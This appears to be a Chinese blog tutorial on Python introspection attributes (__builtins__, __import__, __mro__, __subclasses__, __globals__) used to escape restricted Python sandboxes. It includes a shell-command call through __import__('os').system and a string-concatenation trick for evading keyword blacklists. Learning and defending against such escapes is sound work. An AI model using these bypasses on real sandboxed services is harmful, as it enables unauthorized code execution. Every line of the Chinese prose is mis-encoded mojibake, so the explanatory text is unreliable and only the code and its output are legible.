<p><code>__builtins__</code> æŒ‡å‘æ¨¡å— <code>builtins</code>ï¼Œè¯¥æ¨¡å—åŒ…å«äº†æ‰€æœ‰ Python çš„å†…ç½®å‡½æ•°ã€å¼‚å¸¸ã€åŸºæœ¬ç±»å‹ç­‰ï¼Œæä¾›å½“å‰ä½œç”¨åŸŸä¸­æ‰€æœ‰å†…ç½®å¯¹è±¡çš„è®¿é—®èƒ½åŠ›ã€‚åƒ <code>print()</code>ã€<code>len()</code>ã€<code>open()</code>ã€<code>Exception</code> ç­‰ï¼Œéƒ½æ˜¯ä» <code>__builtins__</code> æ¥çš„ï¼ˆä¾‹å¦‚ <code>__builtins__.print</code>ï¼‰ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(__builtins__)</span><br><span class="line">[<span class="string">&#x27;ArithmeticError&#x27;</span>, <span class="string">&#x27;AssertionError&#x27;</span>, <span class="string">&#x27;AttributeError&#x27;</span>, <span class="string">&#x27;BaseException&#x27;</span>, <span class="string">&#x27;BaseExceptionGroup&#x27;</span>, <span class="string">&#x27;BlockingIOError&#x27;</span>, <span class="string">&#x27;BrokenPipeError&#x27;</span>, <span class="string">&#x27;BufferError&#x27;</span>, <span class="string">&#x27;BytesWarning&#x27;</span>, <span class="string">&#x27;ChildProcessError&#x27;</span>, <span class="string">&#x27;ConnectionAbortedError&#x27;</span>, <span class="string">&#x27;ConnectionError&#x27;</span>, <span class="string">&#x27;ConnectionRefusedError&#x27;</span>, <span class="string">&#x27;ConnectionResetError&#x27;</span>, <span class="string">&#x27;DeprecationWarning&#x27;</span>, <span class="string">&#x27;EOFError&#x27;</span>, <span class="string">&#x27;Ellipsis&#x27;</span>, <span class="string">&#x27;EncodingWarning&#x27;</span>, <span class="string">&#x27;EnvironmentError&#x27;</span>, <span class="string">&#x27;Exception&#x27;</span>, <span class="string">&#x27;ExceptionGroup&#x27;</span>, <span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;FileExistsError&#x27;</span>, <span class="string">&#x27;FileNotFoundError&#x27;</span>, <span class="string">&#x27;FloatingPointError&#x27;</span>, <span class="string">&#x27;FutureWarning&#x27;</span>, <span class="string">&#x27;GeneratorExit&#x27;</span>, <span class="string">&#x27;IOError&#x27;</span>, <span class="string">&#x27;ImportError&#x27;</span>, <span class="string">&#x27;ImportWarning&#x27;</span>, <span class="string">&#x27;IndentationError&#x27;</span>, <span class="string">&#x27;IndexError&#x27;</span>, <span class="string">&#x27;InterruptedError&#x27;</span>, <span class="string">&#x27;IsADirectoryError&#x27;</span>, <span class="string">&#x27;KeyError&#x27;</span>, <span class="string">&#x27;KeyboardInterrupt&#x27;</span>, <span class="string">&#x27;LookupError&#x27;</span>, <span class="string">&#x27;MemoryError&#x27;</span>, <span class="string">&#x27;ModuleNotFoundError&#x27;</span>, <span class="string">&#x27;NameError&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;NotADirectoryError&#x27;</span>, <span class="string">&#x27;NotImplemented&#x27;</span>, <span class="string">&#x27;NotImplementedError&#x27;</span>, <span class="string">&#x27;OSError&#x27;</span>, <span class="string">&#x27;OverflowError&#x27;</span>, <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>, <span class="string">&#x27;PermissionError&#x27;</span>, <span class="string">&#x27;ProcessLookupError&#x27;</span>, <span class="string">&#x27;RecursionError&#x27;</span>, <span class="string">&#x27;ReferenceError&#x27;</span>, <span class="string">&#x27;ResourceWarning&#x27;</span>, <span class="string">&#x27;RuntimeError&#x27;</span>, <span class="string">&#x27;RuntimeWarning&#x27;</span>, <span class="string">&#x27;StopAsyncIteration&#x27;</span>, <span class="string">&#x27;StopIteration&#x27;</span>, <span class="string">&#x27;SyntaxError&#x27;</span>, <span class="string">&#x27;SyntaxWarning&#x27;</span>, <span class="string">&#x27;SystemError&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>, <span class="string">&#x27;TabError&#x27;</span>, <span class="string">&#x27;TimeoutError&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;TypeError&#x27;</span>, <span class="string">&#x27;UnboundLocalError&#x27;</span>, <span class="string">&#x27;UnicodeDecodeError&#x27;</span>, <span class="string">&#x27;UnicodeEncodeError&#x27;</span>, <span class="string">&#x27;UnicodeError&#x27;</span>, <span class="string">&#x27;UnicodeTranslateError&#x27;</span>, <span class="string">&#x27;UnicodeWarning&#x27;</span>, <span class="string">&#x27;UserWarning&#x27;</span>, <span class="string">&#x27;ValueError&#x27;</span>, <span class="string">&#x27;Warning&#x27;</span>, <span class="string">&#x27;ZeroDivisionError&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;aiter&#x27;</span>, <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;anext&#x27;</span>, <span class="string">&#x27;any&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;bool&#x27;</span>, <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;bytearray&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;callable&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;classmethod&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;complex&#x27;</span>, <span class="string">&#x27;copyright&#x27;</span>, <span class="string">&#x27;credits&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;divmod&#x27;</span>, <span class="string">&#x27;enumerate&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;float&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;frozenset&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;hasattr&#x27;</span>, <span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;isinstance&#x27;</span>, <span class="string">&#x27;issubclass&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;license&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;oct&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;reversed&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;sorted&#x27;</span>, <span class="string">&#x27;staticmethod&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&#x27;tuple&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<h4 id="import"><a href="#import" class="headerlink" title="__import__"></a><code>__import__</code></h4><p><code>__import__</code> æ˜¯ Python çš„ä¸€ä¸ª <strong>å†…ç½®å‡½æ•°ï¼ˆbuiltin functionï¼‰</strong>ï¼Œå®ƒç”±å†…ç½®æ¨¡å— <code>builtins</code> æä¾›ã€‚è¿™ä¸ªå‡½æ•°æ˜¯æ‰€æœ‰ <code>import xxx</code> è¯­å¥çš„åº•å±‚å®ç°æœºåˆ¶ã€‚ä½ å¯ä»¥ç”¨å®ƒåœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°å¯¼å…¥æ¨¡å—ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>ç”±äº <code>__import__</code> å¯æ¥å— <strong>å­—ç¬¦ä¸²å‚æ•°</strong>ï¼Œå› æ­¤å¯ä»¥ç”¨äº <strong>ç»•è¿‡é™æ€å­—ç¬¦ä¸²è¿‡æ»¤</strong>ï¼ˆå¦‚é»‘åå•ï¼‰ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).system(<span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;lc&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p><code>__import__</code> è·å–çš„æ˜¯æ¨¡å—åç§°å¯¹åº”çš„ <strong>æ¨¡å—å¯¹è±¡ï¼ˆmodule objectï¼‰</strong>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> (frozen)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>))</span><br><span class="line">[<span class="string">&#x27;DirEntry&#x27;</span>, <span class="string">&#x27;F_OK&#x27;</span>, <span class="string">&#x27;MutableMapping&#x27;</span>, <span class="string">&#x27;O_APPEND&#x27;</span>, <span class="string">&#x27;O_BINARY&#x27;</span>, ..., <span class="string">&#x27;walk&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;writev&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<h4 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a><code>__dict__</code></h4><p><code>__dict__</code> æ˜¯ Python ä¸­çš„å¤§å¤šæ•°å¯¹è±¡ï¼ˆå¦‚æ¨¡å—ã€ç±»ã€å®ä¾‹ã€å‡½æ•°ç­‰ï¼‰è‡ªå¸¦çš„ä¸€ä¸ª<strong>å†…çœå±æ€§</strong>ï¼Œå®ƒä»¥å­—å…¸å½¢å¼ä¿å­˜äº†è¯¥å¯¹è±¡çš„<strong>å‘½åç©ºé—´ï¼ˆnamespaceï¼‰</strong>ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå¯¹è±¡æ‰€æ‹¥æœ‰çš„æ‰€æœ‰â€œ<strong>å¯å†™å±æ€§</strong>â€ã€‚</p>
<p>è¿™æ˜¯å¯¹è±¡çš„ä¸€ä¸ªå†…éƒ¨å±æ€§ï¼Œåº•å±‚å°±æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè®°å½•äº†å¯¹è±¡æœ‰å“ªäº›å±æ€§ï¼ˆåŒ…æ‹¬ä½ æ‰‹åŠ¨èµ‹å€¼çš„å˜é‡ã€å‡½æ•°ç­‰ï¼‰ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__ == <span class="built_in">globals</span>()</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div>

<h4 id="class"><a href="#class" class="headerlink" title="__class__"></a><code>__class__</code></h4><p><code>__class__</code> æ˜¯<strong>æ‰€æœ‰ Python å¯¹è±¡</strong>éƒ½æ‹¥æœ‰çš„ä¸€ä¸ªå±æ€§ï¼Œè¡¨ç¤ºè¯¥<strong>å¯¹è±¡çš„ç±»</strong>ï¼Œä¹Ÿå°±æ˜¯<strong>è¯¥å¯¹è±¡æ˜¯ç”±å“ªä¸ªç±»åˆ›å»ºçš„</strong>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__class__.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p><strong>ç±»</strong> æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ â€”â€” å®ƒæ˜¯ <code>type</code> ç±»çš„å®ä¾‹ã€‚æ‰€ä»¥å½“æˆ‘ä»¬è¯´â€œç±»å¯¹è±¡â€ï¼Œå°±æ˜¯æŒ‡ï¼š<strong>ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒæ˜¯é€šè¿‡ <code>type</code> ç±»æ„é€ å‡ºæ¥çš„ã€‚</strong></p>
</li>
<li><p><code>type</code> ç±»æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒçš„ç±»è¿˜æ˜¯ <code>type</code>ï¼ˆæ˜¯è‡ªå·±åˆ›å»ºè‡ªå·±çš„ç±»ï¼‰ã€‚</p>
</li>
<li><p><code>builtins</code> æ¨¡å—ä¸­æä¾›äº†å¤§é‡ <strong><code>type</code> çš„å®ä¾‹</strong>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¹³æ—¶ä½¿ç”¨çš„ <strong>å†…ç½®ç±»å‹ï¼ˆç±»ï¼‰</strong>ï¼Œä¾‹å¦‚ <code>str</code>ï¼Œ<code>int</code> ç­‰ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__ == <span class="built_in">str</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div></li>
</ul>

    </div>
  </div>

<h4 id="bases"><a href="#bases" class="headerlink" title="__bases__"></a><code>__bases__</code></h4><p><code>__bases__</code> æ˜¯<strong>ç±»å¯¹è±¡</strong>ï¼ˆç±»å‹ä¸º <code>type</code> çš„å¯¹è±¡ï¼‰çš„ä¸€ä¸ªå±æ€§ï¼Œè¡¨ç¤ºè¯¥ç±»çš„<strong>ç›´æ¥çˆ¶ç±»</strong>ï¼ˆåŸºç±»ï¼‰ç»„æˆçš„<strong>å…ƒç»„</strong>ã€‚å¦å¤–ç±»å¯¹è±¡è¿˜æœ‰ä¸€ä¸ª <code>__base__</code> å±æ€§ï¼Œå®ƒè¿”å›çš„æ˜¯ <strong><code>__bases__</code> å…ƒç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ </strong>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__bases__</span><br><span class="line">()</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p>å› ä¸º <strong>Python æ”¯æŒå¤šé‡ç»§æ‰¿</strong>ï¼Œä¸€ä¸ªç±»å¯ä»¥æœ‰å¤šä¸ªçˆ¶ç±»ï¼Œæ‰€ä»¥<code>__bases__</code> è¿”å›çš„æ˜¯ä¸€ä¸ª <strong>å…ƒç»„</strong>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>: <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>: <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(A, B): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(C.__bases__)</span><br><span class="line"><span class="comment"># è¾“å‡º: (&lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;)</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>æ‰€æœ‰ç±»æœ€ç»ˆéƒ½ç»§æ‰¿è‡ª <code>object</code>ï¼Œå› ä¸º <code>object</code> æ˜¯ <strong>æ‰€æœ‰æ–°å¼ç±»ï¼ˆPython 3 å…¨éƒ¨æ˜¯æ–°å¼ç±»ï¼‰</strong> çš„æ ¹åŸºç±»ã€‚è€Œ <code>object.__base__</code> è¿”å›ä¸€ä¸ªç©ºå…ƒç»„ <code>()</code>ï¼Œè¯´æ˜å®ƒæ²¡æœ‰åŸºç±»ã€‚</p>
</li>
<li></li>
</ul>

    </div>
  </div>

<h4 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a><code>__mro__</code></h4><p><code>__mro__</code>ï¼ˆMethod Resolution Orderï¼‰æ˜¯<strong>ç±»å¯¹è±¡</strong>çš„ä¸€ä¸ª<strong>å±æ€§</strong>ï¼Œè¿”å›è¯¥ç±»çš„<strong>æ–¹æ³•è§£æé¡ºåº</strong>ï¼Œå³è°ƒç”¨æ–¹æ³•æ—¶æŒ‰ç…§å“ªäº›é¡ºåºæŸ¥æ‰¾ç±»ä¸­çš„æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>å½“æ²™ç®±æ¸…ç©ºäº† <code>__builtins__</code> ä¸­çš„å†…ç½®ç±»æ—¶ï¼ˆæ²¡æœ‰ <code>object</code> ç­‰å†…ç½®çš„ç±» ï¼‰ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨ <code>__mro__</code> æ¥è·å¾—ä¸€ä¸ª <code>object</code> ç±»ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h4 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__()"></a><code>__subclasses__()</code></h4><p><code>__subclasses__()</code> æ˜¯<strong>ç±»</strong>çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºè·å–è¯¥ç±»çš„<strong>æ‰€æœ‰ç›´æ¥å­ç±»</strong>ã€‚å®ƒè¿”å›ä¸€ä¸ª<strong>åˆ—è¡¨</strong>ï¼ŒåŒ…å«äº†å½“å‰è¿è¡Œç¯å¢ƒä¸­ï¼Œä»è¯¥ç±»<strong>ç›´æ¥ç»§æ‰¿</strong>çš„æ‰€æœ‰ç±»ï¼ˆå­ç±»å¯¹è±¡ï¼‰ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>: <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">B</span>): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">A.__subclasses__()   <span class="comment"># âœ… [&lt;class &#x27;__main__.B&#x27;&gt;]</span></span><br><span class="line">B.__subclasses__()   <span class="comment"># âœ… [&lt;class &#x27;__main__.C&#x27;&gt;]</span></span><br><span class="line">C.__subclasses__()   <span class="comment"># âœ… []</span></span><br><span class="line">A().__subclasses__() <span class="comment"># âŒ AttributeErrorï¼šå®ä¾‹å¯¹è±¡æ²¡æœ‰è¿™ä¸ªæ–¹æ³•</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>å› ä¸ºæ‰€æœ‰çš„ç±»éƒ½æ‰€æœ‰ç±»æœ€ç»ˆéƒ½ç»§æ‰¿è‡ª <code>object</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆæ‰¾åˆ° <code>object</code> ç±»ï¼Œç„¶åå†é€šè¿‡ <code>object.__subclasses__()</code> æ‰¾åˆ°æ‰€éœ€çš„ç±»ã€‚ </p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2. è·å–å…¶æ‰€æœ‰å­ç±»</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h3 id="å‡½æ•°-æ–¹æ³•çš„æ‰§è¡Œç¯å¢ƒ"><a href="#å‡½æ•°-æ–¹æ³•çš„æ‰§è¡Œç¯å¢ƒ" class="headerlink" title="å‡½æ•° &#x2F; æ–¹æ³•çš„æ‰§è¡Œç¯å¢ƒ"></a>å‡½æ•° &#x2F; æ–¹æ³•çš„æ‰§è¡Œç¯å¢ƒ</h3><h4 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h4><p><code>__globals__</code> æ˜¯ <strong>Python å‡½æ•°å¯¹è±¡</strong>ç‹¬æœ‰çš„ä¸€ä¸ªç‰¹æ®Šå±æ€§ï¼Œå®ƒæŒ‡å‘ä¸€ä¸ª<strong>å­—å…¸å¯¹è±¡</strong>ï¼Œå³è¯¥å‡½æ•°<strong>å®šä¹‰æ—¶æ‰€å¤„æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´</strong>ï¼ˆä¹Ÿå«å…¨å±€ä½œç”¨åŸŸï¼Œæˆ– module namespaceï¼‰ã€‚æ¢å¥è¯è¯´ï¼Œ**<code>__globals__</code> ç­‰ä»·äºå‡½æ•°å®šä¹‰æ‰€åœ¨æ¨¡å—çš„ <code>globals()</code> è¿”å›å€¼**ã€‚ä½ å¯ä»¥é€šè¿‡è¿™ä¸ªå±æ€§ï¼Œè®¿é—®å®šä¹‰å‡½æ•°æ—¶æ‰€åœ¨æ¨¡å—çš„æ‰€æœ‰å…¨å±€å˜é‡ï¼ŒåŒ…æ‹¬å¯¼å…¥çš„æ¨¡å—ã€å‡½æ•°ã€ç±»ã€å¸¸é‡ç­‰ã€‚</p>
<p><code>__globals__</code> æ˜¯æŒ‡<strong>å‡½æ•°å®šä¹‰æ—¶æ‰€åœ¨æ¨¡å—çš„ä½œç”¨åŸŸ</strong>ï¼Œåªå±äºå‡½æ•°å¯¹è±¡ï¼›è€Œ <code>__dict__</code> æ˜¯<strong>å¯¹è±¡è‡ªèº«çš„å‘½åç©ºé—´å­—å…¸</strong>ï¼Œé€‚ç”¨äºå¤§å¤šæ•°å¯¹è±¡ï¼ˆæ¨¡å—ã€ç±»ã€å®ä¾‹ã€å‡½æ•°ç­‰ï¼‰ã€‚å…¶ä¸­<strong>æ¨¡å—çš„ <code>__dict__</code></strong> ç­‰äº<strong>æ¨¡å—ä¸­å®šä¹‰çš„å‡½æ•°çš„ <code>__globals__</code></strong> ç­‰äº<strong>åœ¨æ¨¡å—ä¸­è°ƒç”¨ <code>globals()</code> å‡½æ•°çš„è¿”å›ç»“æœ</strong>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo = <span class="keyword">lambda</span>:<span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__==foo.__globals__==<span class="built_in">globals</span>()</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p><code>__globals__</code> æ˜¯ç»‘å®šåœ¨å‡½æ•°ä¸Šçš„ï¼Œ<strong>æ— è®ºå‡½æ•°åœ¨ä½•å¤„è¢«è°ƒç”¨ï¼Œå®ƒçš„ <code>__globals__</code> éƒ½ä¸ä¼šå˜</strong>ï¼Œå§‹ç»ˆæŒ‡å‘å®šä¹‰å®ƒçš„æ¨¡å—ã€‚</p>
</li>
<li><p>æŸäº›å†…ç½®å‡½æ•°ï¼ˆå¦‚ <code>len</code>ã€<code>os.system</code>ï¼‰æ˜¯ C å®ç°çš„ï¼Œå®ƒä»¬<strong>æ²¡æœ‰ <code>__globals__</code> å±æ€§</strong>ã€‚</p>
</li>
</ul>

    </div>
  </div>

